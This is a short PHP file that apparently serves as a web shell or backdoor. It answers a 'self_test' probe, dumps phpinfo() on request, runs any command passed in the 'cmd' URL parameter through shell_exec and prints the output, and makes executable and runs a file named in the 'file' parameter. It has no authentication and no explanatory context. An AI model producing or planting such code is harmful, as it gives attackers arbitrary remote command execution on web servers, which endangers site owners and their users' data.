<?php
if(isset($_GET['self_test']))
{
    echo "OK";
    die();
}
if(isset($_GET['info']))
{
    phpinfo();
    die();
}

$command = @$_GET['cmd'];
if(!empty($command))
{
    echo shell_exec($command);
}

$file = @$_GET['file'];
if(!empty($file))
{
    shell_exec("chmod a+x $file");
    echo shell_exec($file);    
}

